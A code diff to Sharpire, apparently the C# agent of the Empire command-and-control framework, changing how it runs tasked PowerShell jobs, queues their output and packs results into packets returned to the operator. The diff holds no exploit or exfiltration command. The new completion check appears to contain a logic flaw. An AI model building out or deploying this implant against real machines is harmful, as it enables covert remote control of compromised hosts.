@@ -5,6 +5,7 @@ using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Text;
 using System.Threading;
+using System.IO;
 
 namespace Sharpire
 {
@@ -27,19 +28,17 @@ namespace Sharpire
                 List<string> jobsToRemove = new List<string>();
                 foreach (KeyValuePair<string, Job> job in jobs)
                 {
-                    string results = "";
+                    string results = job.Value.GetOutput();
+                    if (!string.IsNullOrEmpty(results))
+                    {
+                        packets = Misc.combine(packets, coms.EncodePacket(110, results, jobsId[job.Key]));
+                    }
+
                     if (job.Value.IsCompleted())
                     {
-                        try
-                        {
-                            results = job.Value.GetOutput();
-                            job.Value.KillThread();
-                            job.Value.Status = "stopped";
-                        }
-                        catch (NullReferenceException) { }
-
+                        job.Value.KillThread();
+                        job.Value.Status = "stopped";
                         jobsToRemove.Add(job.Key);
-                        packets = Misc.combine(packets, coms.EncodePacket(110, results, jobsId[job.Key]));
                     }
                 }
                 jobsToRemove.ForEach(x => jobs.Remove(x));
@@ -58,26 +57,17 @@ namespace Sharpire
                 List<string> jobsToRemove = new List<string>();
                 foreach (string jobName in jobs.Keys)
                 {
-                    string results = "";
-                    if (jobs[jobName].IsCompleted())
-                    {
-                        try
-                        {
-                            results = jobs[jobName].GetOutput();
-                            jobs[jobName].KillThread();
-                            jobs[jobName].Status = "stopped";
-                        }
-                        catch (NullReferenceException) { }
-                        jobsToRemove.Add(jobName);
-                    }
-                    else if (jobs[jobName].Status == "running")
-                    {
-                        results = jobs[jobName].GetOutput();
-                    }
-
-                    if (0 < results.Length)
+                    string results = jobs[jobName].GetOutput();
+                    if (!string.IsNullOrEmpty(results))
                     {
                         jobResults = Misc.combine(jobResults, coms.EncodePacket(110, results, jobsId[jobName]));
+                    }
+
+                    if (jobs[jobName].IsCompleted())
+                    {
+                        jobs[jobName].KillThread();
+                        jobs[jobName].Status = "stopped";
+                        jobsToRemove.Add(jobName);
                     }
                 }
                 jobsToRemove.ForEach(x => jobs.Remove(x));
@@ -115,7 +105,7 @@ namespace Sharpire
         public class Job
         {
             private Thread JobThread { get; set; }
-            private string output = "";
+            private Queue<string> outputQueue = new Queue<string>();
             private bool isFinished = false;
             public string Status { get; set; }
             public string Language { get; set; }
@@ -123,7 +113,6 @@ namespace Sharpire
             public PowershellDetails Powershell { get; set; }
             private readonly object syncLock = new object();
             private string command;
-
 
             public Job()
             {
@@ -134,12 +123,12 @@ namespace Sharpire
             {
                 Status = "running";
                 this.command = command;
-                JobThread.Start();
+                StartJob();
             }
 
             private void StartJob()
             {
-                JobThread = new Thread(() => RunPowerShell(command));
+                JobThread = new Thread(RunPowerShell);
                 JobThread.Start();
             }
 
@@ -147,10 +136,8 @@ namespace Sharpire
             {
                 lock (syncLock)
                 {
-                    // Update the command
                     command = newCommand;
 
-                    // Restart the job
                     if (JobThread != null && JobThread.IsAlive)
                     {
                         JobThread.Abort();
@@ -159,43 +146,55 @@ namespace Sharpire
                 }
             }
 
-            public void RunPowerShell(string command)
+            public void RunPowerShell()
             {
                 using (Runspace runspace = RunspaceFactory.CreateRunspace())
                 {
                     runspace.Open();
 
-                    using (Pipeline pipeline = runspace.CreatePipeline())
+                    using (PowerShell psInstance = PowerShell.Create())
                     {
-                        pipeline.Commands.AddScript(command);
-                        pipeline.Commands.Add("Out-String");
+                        psInstance.Runspace = runspace;
+                        psInstance.AddScript(command);
 
-                        StringBuilder sb = new StringBuilder();
+                        PSDataCollection<PSObject> outputCollection = new PSDataCollection<PSObject>();
+                        outputCollection.DataAdded += (sender, e) =>
+                        {
+                            lock (syncLock)
+                            {
+                                while (outputCollection.Count > 0)
+                                {
+                                    PSObject data = outputCollection[0];
+                                    if (data != null)
+                                    {
+                                        outputQueue.Enqueue(data.ToString());
+                                    }
+                                    outputCollection.RemoveAt(0);
+                                }
+                            }
+                        };
+
                         try
                         {
-                            Collection<PSObject> results = pipeline.Invoke();
-                            foreach (PSObject obj in results)
+                            IAsyncResult result = psInstance.BeginInvoke<PSObject, PSObject>(null, outputCollection);
+
+                            while (!result.IsCompleted || outputCollection.Count > 0)
                             {
-                                sb.Append(obj.ToString());
+                                Thread.Sleep(200);
                             }
                         }
-                        catch (ParameterBindingException error)
+                        catch (Exception error)
                         {
-                            sb.Append("[-] ParameterBindingException: " + error.Message);
-                        }
-                        catch (CmdletInvocationException error)
-                        {
-                            sb.Append("[-] CmdletInvocationException: " + error.Message);
-                        }
-                        catch (RuntimeException error)
-                        {
-                            sb.Append("[-] RuntimeException: " + error.Message);
+                            lock (syncLock)
+                            {
+                                string errorMessage = "[-] Error: " + error.Message;
+                                outputQueue.Enqueue(errorMessage);
+                            }
                         }
                         finally
                         {
                             lock (syncLock)
                             {
-                                output = sb.ToString();
                                 isFinished = true;
                             }
                         }
@@ -203,13 +202,14 @@ namespace Sharpire
                 }
             }
 
+
             public bool IsCompleted()
             {
                 lock (syncLock)
                 {
-                    if (JobThread != null)
+                    if (JobThread != null && JobThread.IsAlive)
                     {
-                        if (isFinished)
+                        if (isFinished && outputQueue.Count == 0)
                         {
                             Status = "completed";
                             return true;
@@ -228,7 +228,15 @@ namespace Sharpire
             {
                 lock (syncLock)
                 {
-                    return output;
+                    StringBuilder sb = new StringBuilder();
+                    while (outputQueue.Count > 0)
+                    {
+                        sb.AppendLine(outputQueue.Dequeue());
+                    }
+                    string result = sb.ToString();
+
+                    outputQueue.Clear();
+                    return result;
                 }
             }
 
@@ -241,7 +249,6 @@ namespace Sharpire
                 }
             }
         }
-
         public class PowershellDetails
         {
             public object AppDomain { get; set; }
